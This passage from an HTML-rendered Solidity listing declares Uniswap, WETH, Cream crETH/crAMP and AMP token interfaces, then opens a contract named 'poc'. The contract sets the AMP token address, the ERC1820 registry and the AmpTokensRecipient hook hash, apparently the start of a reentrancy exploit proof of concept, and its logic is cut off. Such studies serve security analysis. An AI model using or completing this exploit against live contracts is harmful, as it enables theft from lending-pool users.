;</span><br><span class="line">    function nonces( address  ) external view returns (uint256 ) ;</span><br><span class="line">    function permit( address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s ) external   ;</span><br><span class="line">    function price0CumulativeLast(  ) external view returns (uint256 ) ;</span><br><span class="line">    function price1CumulativeLast(  ) external view returns (uint256 ) ;</span><br><span class="line">    function skim( address to ) external   ;</span><br><span class="line">    function swap( uint256 amount0Out,uint256 amount1Out,address to,bytes memory data ) external   ;</span><br><span class="line">    function symbol(  ) external view returns (string memory ) ;</span><br><span class="line">    function sync(  ) external   ;</span><br><span class="line">    function token0(  ) external view returns (address ) ;</span><br><span class="line">    function token1(  ) external view returns (address ) ;</span><br><span class="line">    function totalSupply(  ) external view returns (uint256 ) ;</span><br><span class="line">    function transfer( address to,uint256 value ) external  returns (bool ) ;</span><br><span class="line">    function transferFrom( address from,address to,uint256 value ) external  returns (bool ) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Uni_Router_V2&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function WETH(  ) external view returns (address ) ;</span><br><span class="line">    function addLiquidity( address tokenA,address tokenB,uint256 amountADesired,uint256 amountBDesired,uint256 amountAMin,uint256 amountBMin,address to,uint256 deadline ) external  returns (uint256 amountA, uint256 amountB, uint256 liquidity) ;</span><br><span class="line">    function addLiquidityETH( address token,uint256 amountTokenDesired,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity) ;</span><br><span class="line">    function factory(  ) external view returns (address ) ;</span><br><span class="line">    function getAmountIn( uint256 amountOut,uint256 reserveIn,uint256 reserveOut ) external pure returns (uint256 amountIn) ;</span><br><span class="line">    function getAmountOut( uint256 amountIn,uint256 reserveIn,uint256 reserveOut ) external pure returns (uint256 amountOut) ;</span><br><span class="line">    function getAmountsIn( uint256 amountOut,address[] memory path ) external view returns (uint256[] memory amounts) ;</span><br><span class="line">    function getAmountsOut( uint256 amountIn,address[] memory path ) external view returns (uint256[] memory amounts) ;</span><br><span class="line">    function quote( uint256 amountA,uint256 reserveA,uint256 reserveB ) external pure returns (uint256 amountB) ;</span><br><span class="line">    function removeLiquidity( address tokenA,address tokenB,uint256 liquidity,uint256 amountAMin,uint256 amountBMin,address to,uint256 deadline ) external  returns (uint256 amountA, uint256 amountB) ;</span><br><span class="line">    function removeLiquidityETH( address token,uint256 liquidity,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline ) external  returns (uint256 amountToken, uint256 amountETH) ;</span><br><span class="line">    function removeLiquidityETHSupportingFeeOnTransferTokens( address token,uint256 liquidity,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline ) external  returns (uint256 amountETH) ;</span><br><span class="line">    function removeLiquidityETHWithPermit( address token,uint256 liquidity,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline,bool approveMax,uint8 v,bytes32 r,bytes32 s ) external  returns (uint256 amountToken, uint256 amountETH) ;</span><br><span class="line">    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token,uint256 liquidity,uint256 amountTokenMin,uint256 amountETHMin,address to,uint256 deadline,bool approveMax,uint8 v,bytes32 r,bytes32 s ) external  returns (uint256 amountETH) ;</span><br><span class="line">    function removeLiquidityWithPermit( address tokenA,address tokenB,uint256 liquidity,uint256 amountAMin,uint256 amountBMin,address to,uint256 deadline,bool approveMax,uint8 v,bytes32 r,bytes32 s ) external  returns (uint256 amountA, uint256 amountB) ;</span><br><span class="line">    function swapETHForExactTokens( uint256 amountOut,address[] memory path,address to,uint256 deadline ) external payable returns (uint256[] memory amounts) ;</span><br><span class="line">    function swapExactETHForTokens( uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external payable returns (uint256[] memory amounts) ;</span><br><span class="line">    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external payable  ;</span><br><span class="line">    function swapExactTokensForETH( uint256 amountIn,uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external  returns (uint256[] memory amounts) ;</span><br><span class="line">    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn,uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external   ;</span><br><span class="line">    function swapExactTokensForTokens( uint256 amountIn,uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external  returns (uint256[] memory amounts) ;</span><br><span class="line">    function swapExactTokensForTokensSupportingFeeOnTransferTokens( uint256 amountIn,uint256 amountOutMin,address[] memory path,address to,uint256 deadline ) external   ;</span><br><span class="line">    function swapTokensForExactETH( uint256 amountOut,uint256 amountInMax,address[] memory path,address to,uint256 deadline ) external  returns (uint256[] memory amounts) ;</span><br><span class="line">    function swapTokensForExactTokens( uint256 amountOut,uint256 amountInMax,address[] memory path,address to,uint256 deadline ) external  returns (uint256[] memory amounts) ;</span><br><span class="line">    // receive () external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface WETH9 &#123;</span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function approve(address guy, uint256 wad) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address src,</span><br><span class="line">        address dst,</span><br><span class="line">        uint256 wad</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 wad) external;</span><br><span class="line"></span><br><span class="line">    function decimals() external view returns (uint8);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function transfer(address dst, uint256 wad) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable;</span><br><span class="line"></span><br><span class="line">    function allowance(address, address) external view returns (uint256);</span><br><span class="line">    // 由于高版本的问题，这行要注释掉</span><br><span class="line">    // fallback() external payable;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed src, address indexed guy, uint256 wad);</span><br><span class="line">    event Transfer(address indexed src, address indexed dst, uint256 wad);</span><br><span class="line">    event Deposit(address indexed dst, uint256 wad);</span><br><span class="line">    event Withdrawal(address indexed src, uint256 wad);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface crETH &#123;</span><br><span class="line">    event AccrueInterest(</span><br><span class="line">        uint256 cashPrior,</span><br><span class="line">        uint256 interestAccumulated,</span><br><span class="line">        uint256 borrowIndex,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Borrow(</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        uint256 accountBorrows,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event Failure(uint256 error, uint256 info, uint256 detail);</span><br><span class="line">    event LiquidateBorrow(</span><br><span class="line">        address liquidator,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 repayAmount,</span><br><span class="line">        address cTokenCollateral,</span><br><span class="line">        uint256 seizeTokens</span><br><span class="line">    );</span><br><span class="line">    event Mint(address minter, uint256 mintAmount, uint256 mintTokens);</span><br><span class="line">    event NewAdmin(address oldAdmin, address newAdmin);</span><br><span class="line">    event NewComptroller(address oldComptroller, address newComptroller);</span><br><span class="line">    event NewMarketInterestRateModel(</span><br><span class="line">        address oldInterestRateModel,</span><br><span class="line">        address newInterestRateModel</span><br><span class="line">    );</span><br><span class="line">    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);</span><br><span class="line">    event NewReserveFactor(</span><br><span class="line">        uint256 oldReserveFactorMantissa,</span><br><span class="line">        uint256 newReserveFactorMantissa</span><br><span class="line">    );</span><br><span class="line">    event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);</span><br><span class="line">    event RepayBorrow(</span><br><span class="line">        address payer,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 repayAmount,</span><br><span class="line">        uint256 accountBorrows,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event ReservesAdded(</span><br><span class="line">        address benefactor,</span><br><span class="line">        uint256 addAmount,</span><br><span class="line">        uint256 newTotalReserves</span><br><span class="line">    );</span><br><span class="line">    event ReservesReduced(</span><br><span class="line">        address admin,</span><br><span class="line">        uint256 reduceAmount,</span><br><span class="line">        uint256 newTotalReserves</span><br><span class="line">    );</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line"></span><br><span class="line">    //由于高版本的问题，这行要注释掉</span><br><span class="line">    // fallback() external payable;</span><br><span class="line"></span><br><span class="line">    function _acceptAdmin() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _reduceReserves(uint256 reduceAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setComptroller(address newComptroller) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setInterestRateModel(address newInterestRateModel)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setPendingAdmin(address newPendingAdmin)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setReserveFactor(uint256 newReserveFactorMantissa)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function accrualBlockNumber() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function accrueInterest() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function admin() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOfUnderlying(address owner) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrow(uint256 borrowAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowBalanceCurrent(address account) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowBalanceStored(address account)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowIndex() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowRatePerBlock() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function comptroller() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function decimals() external view returns (uint8);</span><br><span class="line"></span><br><span class="line">    function exchangeRateCurrent() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function exchangeRateStored() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function getAccountSnapshot(address account)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            uint256,</span><br><span class="line">            uint256,</span><br><span class="line">            uint256,</span><br><span class="line">            uint256</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    function getCash() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function initialize(</span><br><span class="line">        address comptroller_,</span><br><span class="line">        address interestRateModel_,</span><br><span class="line">        uint256 initialExchangeRateMantissa_,</span><br><span class="line">        string memory name_,</span><br><span class="line">        string memory symbol_,</span><br><span class="line">        uint8 decimals_</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function interestRateModel() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function isCToken() external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function liquidateBorrow(address borrower, address cTokenCollateral)</span><br><span class="line">        external</span><br><span class="line">        payable;</span><br><span class="line"></span><br><span class="line">    function mint() external payable;</span><br><span class="line"></span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function pendingAdmin() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function redeem(uint256 redeemTokens) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function repayBorrow() external payable;</span><br><span class="line"></span><br><span class="line">    function repayBorrowBehalf(address borrower) external payable;</span><br><span class="line"></span><br><span class="line">    function reserveFactorMantissa() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function seize(</span><br><span class="line">        address liquidator,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 seizeTokens</span><br><span class="line">    ) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function supplyRatePerBlock() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function totalBorrows() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalBorrowsCurrent() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalReserves() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address dst, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address src,</span><br><span class="line">        address dst,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface crAMP &#123;</span><br><span class="line">    event AccrueInterest(</span><br><span class="line">        uint256 cashPrior,</span><br><span class="line">        uint256 interestAccumulated,</span><br><span class="line">        uint256 borrowIndex,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 amount</span><br><span class="line">    );</span><br><span class="line">    event Borrow(</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        uint256 accountBorrows,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event Failure(uint256 error, uint256 info, uint256 detail);</span><br><span class="line">    event LiquidateBorrow(</span><br><span class="line">        address liquidator,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 repayAmount,</span><br><span class="line">        address cTokenCollateral,</span><br><span class="line">        uint256 seizeTokens</span><br><span class="line">    );</span><br><span class="line">    event Mint(address minter, uint256 mintAmount, uint256 mintTokens);</span><br><span class="line">    event NewAdmin(address oldAdmin, address newAdmin);</span><br><span class="line">    event NewComptroller(address oldComptroller, address newComptroller);</span><br><span class="line">    event NewImplementation(</span><br><span class="line">        address oldImplementation,</span><br><span class="line">        address newImplementation</span><br><span class="line">    );</span><br><span class="line">    event NewMarketInterestRateModel(</span><br><span class="line">        address oldInterestRateModel,</span><br><span class="line">        address newInterestRateModel</span><br><span class="line">    );</span><br><span class="line">    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);</span><br><span class="line">    event NewReserveFactor(</span><br><span class="line">        uint256 oldReserveFactorMantissa,</span><br><span class="line">        uint256 newReserveFactorMantissa</span><br><span class="line">    );</span><br><span class="line">    event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);</span><br><span class="line">    event RepayBorrow(</span><br><span class="line">        address payer,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 repayAmount,</span><br><span class="line">        uint256 accountBorrows,</span><br><span class="line">        uint256 totalBorrows</span><br><span class="line">    );</span><br><span class="line">    event ReservesAdded(</span><br><span class="line">        address benefactor,</span><br><span class="line">        uint256 addAmount,</span><br><span class="line">        uint256 newTotalReserves</span><br><span class="line">    );</span><br><span class="line">    event ReservesReduced(</span><br><span class="line">        address admin,</span><br><span class="line">        uint256 reduceAmount,</span><br><span class="line">        uint256 newTotalReserves</span><br><span class="line">    );</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 amount);</span><br><span class="line">    </span><br><span class="line">    // 由于高版本的问题，这行要注释掉</span><br><span class="line">    // fallback() external payable;</span><br><span class="line"></span><br><span class="line">    function _acceptAdmin() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _addReserves(uint256 addAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _reduceReserves(uint256 reduceAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setComptroller(address newComptroller) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setImplementation(</span><br><span class="line">        address implementation_,</span><br><span class="line">        bool allowResign,</span><br><span class="line">        bytes memory becomeImplementationData</span><br><span class="line">    ) external;</span><br><span class="line"></span><br><span class="line">    function _setInterestRateModel(address newInterestRateModel)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setPendingAdmin(address newPendingAdmin)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function _setReserveFactor(uint256 newReserveFactorMantissa)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function accrualBlockNumber() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function accrueInterest() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function admin() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function allowance(address owner, address spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address owner) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOfUnderlying(address owner) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrow(uint256 borrowAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowBalanceCurrent(address account) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowBalanceStored(address account)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowIndex() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function borrowRatePerBlock() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function comptroller() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function decimals() external view returns (uint8);</span><br><span class="line"></span><br><span class="line">    function delegateToImplementation(bytes memory data)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes memory);</span><br><span class="line"></span><br><span class="line">    function delegateToViewImplementation(bytes memory data)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bytes memory);</span><br><span class="line"></span><br><span class="line">    function exchangeRateCurrent() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function exchangeRateStored() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function getAccountSnapshot(address account)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (</span><br><span class="line">            uint256,</span><br><span class="line">            uint256,</span><br><span class="line">            uint256,</span><br><span class="line">            uint256</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    function getCash() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function implementation() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function interestRateModel() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function isCToken() external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function liquidateBorrow(</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 repayAmount,</span><br><span class="line">        address cTokenCollateral</span><br><span class="line">    ) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function mint(uint256 mintAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function pendingAdmin() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function redeem(uint256 redeemTokens) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function repayBorrow(uint256 repayAmount) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function repayBorrowBehalf(address borrower, uint256 repayAmount)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function reserveFactorMantissa() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function seize(</span><br><span class="line">        address liquidator,</span><br><span class="line">        address borrower,</span><br><span class="line">        uint256 seizeTokens</span><br><span class="line">    ) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function supplyRatePerBlock() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function totalBorrows() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalBorrowsCurrent() external returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalReserves() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address dst, uint256 amount) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address src,</span><br><span class="line">        address dst,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function underlying() external view returns (address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface AMP &#123;</span><br><span class="line">    event Approval(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line">    event ApprovalByPartition(</span><br><span class="line">        bytes32 indexed partition,</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line">    event AuthorizedOperator(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed tokenHolder</span><br><span class="line">    );</span><br><span class="line">    event AuthorizedOperatorByPartition(</span><br><span class="line">        bytes32 indexed partition,</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed tokenHolder</span><br><span class="line">    );</span><br><span class="line">    event ChangedPartition(</span><br><span class="line">        bytes32 indexed fromPartition,</span><br><span class="line">        bytes32 indexed toPartition,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line">    event CollateralManagerRegistered(address collateralManager);</span><br><span class="line">    event Minted(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes data</span><br><span class="line">    );</span><br><span class="line">    event OwnerUpdate(address indexed oldValue, address indexed newValue);</span><br><span class="line">    event OwnershipTransferAuthorization(address indexed authorizedAddress);</span><br><span class="line">    event PartitionStrategySet(</span><br><span class="line">        bytes4 flag,</span><br><span class="line">        string name,</span><br><span class="line">        address indexed implementation</span><br><span class="line">    );</span><br><span class="line">    event RevokedOperator(</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed tokenHolder</span><br><span class="line">    );</span><br><span class="line">    event RevokedOperatorByPartition(</span><br><span class="line">        bytes32 indexed partition,</span><br><span class="line">        address indexed operator,</span><br><span class="line">        address indexed tokenHolder</span><br><span class="line">    );</span><br><span class="line">    event Swap(address indexed operator, address indexed from, uint256 value);</span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    event TransferByPartition(</span><br><span class="line">        bytes32 indexed fromPartition,</span><br><span class="line">        address operator,</span><br><span class="line">        address indexed from,</span><br><span class="line">        address indexed to,</span><br><span class="line">        uint256 value,</span><br><span class="line">        bytes data,</span><br><span class="line">        bytes operatorData</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    function allowance(address _owner, address _spender)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function allowanceByPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _owner,</span><br><span class="line">        address _spender</span><br><span class="line">    ) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function approve(address _spender, uint256 _value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function approveByPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _spender,</span><br><span class="line">        uint256 _value</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function assumeOwnership() external;</span><br><span class="line"></span><br><span class="line">    function authorizeOperator(address _operator) external;</span><br><span class="line"></span><br><span class="line">    function authorizeOperatorByPartition(bytes32 _partition, address _operator)</span><br><span class="line">        external;</span><br><span class="line"></span><br><span class="line">    function authorizeOwnershipTransfer(address _authorizedAddress) external;</span><br><span class="line"></span><br><span class="line">    function authorizedNewOwner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _tokenHolder) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function balanceOfByPartition(bytes32 _partition, address _tokenHolder)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (uint256);</span><br><span class="line"></span><br><span class="line">    function canImplementInterfaceForAddress(bytes32 _interfaceHash, address)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bytes32);</span><br><span class="line"></span><br><span class="line">    function collateralManagers(uint256) external view returns (address);</span><br><span class="line"></span><br><span class="line">    function decimals() external pure returns (uint8);</span><br><span class="line"></span><br><span class="line">    function decreaseAllowance(address _spender, uint256 _subtractedValue)</span><br><span class="line">        external</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    function decreaseAllowanceByPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _spender,</span><br><span class="line">        uint256 _subtractedValue</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function defaultPartition() external view returns (bytes32);</span><br><span class="line"></span><br><span class="line">    function granularity() external pure returns (uint256);</span><br><span class="line"></span><br><span class="line">    function increaseAllowance(address _spender, uint256 _addedValue)</span><br><span class="line">        external</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    function increaseAllowanceByPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _spender,</span><br><span class="line">        uint256 _addedValue</span><br><span class="line">    ) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function isCollateralManager(address _collateralManager)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    function isOperator(address _operator, address _tokenHolder)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bool);</span><br><span class="line"></span><br><span class="line">    function isOperatorForCollateralManager(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _operator,</span><br><span class="line">        address _collateralManager</span><br><span class="line">    ) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function isOperatorForPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _operator,</span><br><span class="line">        address _tokenHolder</span><br><span class="line">    ) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function isPartitionStrategy(bytes4 _prefix) external view returns (bool);</span><br><span class="line"></span><br><span class="line">    function name() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function owner() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function partitionStrategies(uint256) external view returns (bytes4);</span><br><span class="line"></span><br><span class="line">    function partitionsOf(address _tokenHolder)</span><br><span class="line">        external</span><br><span class="line">        view</span><br><span class="line">        returns (bytes32[] memory);</span><br><span class="line"></span><br><span class="line">    function registerCollateralManager() external;</span><br><span class="line"></span><br><span class="line">    function revokeOperator(address _operator) external;</span><br><span class="line"></span><br><span class="line">    function revokeOperatorByPartition(bytes32 _partition, address _operator)</span><br><span class="line">        external;</span><br><span class="line"></span><br><span class="line">    function setPartitionStrategy(bytes4 _prefix, address _implementation)</span><br><span class="line">        external;</span><br><span class="line"></span><br><span class="line">    function swap(address _from) external;</span><br><span class="line"></span><br><span class="line">    function swapToken() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function swapTokenGraveyard() external view returns (address);</span><br><span class="line"></span><br><span class="line">    function symbol() external view returns (string memory);</span><br><span class="line"></span><br><span class="line">    function totalPartitions() external view returns (bytes32[] memory);</span><br><span class="line"></span><br><span class="line">    function totalSupply() external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function totalSupplyByPartition(bytes32) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) external returns (bool);</span><br><span class="line"></span><br><span class="line">    function transferByPartition(</span><br><span class="line">        bytes32 _partition,</span><br><span class="line">        address _from,</span><br><span class="line">        address _to,</span><br><span class="line">        uint256 _value,</span><br><span class="line">        bytes memory _data,</span><br><span class="line">        bytes memory _operatorData</span><br><span class="line">    ) external returns (bytes32);</span><br><span class="line"></span><br><span class="line">    function transferFrom(</span><br><span class="line">        address _from,</span><br><span class="line">        address _to,</span><br><span class="line">        uint256 _value</span><br><span class="line">    ) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract poc &#123;</span><br><span class="line"></span><br><span class="line">    address constant  AMPToken_Address = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;</span><br><span class="line">    </span><br><span class="line">    address constant  registry = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;</span><br><span class="line">    </span><br><span class="line">    //keccak256(&quot;AmpTokensRecipient&quot;)</span><br><span class="line">    bytes32 constant  TOKENS_RECIPIENT_INTERFACE_HASH = 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;</span><br><span 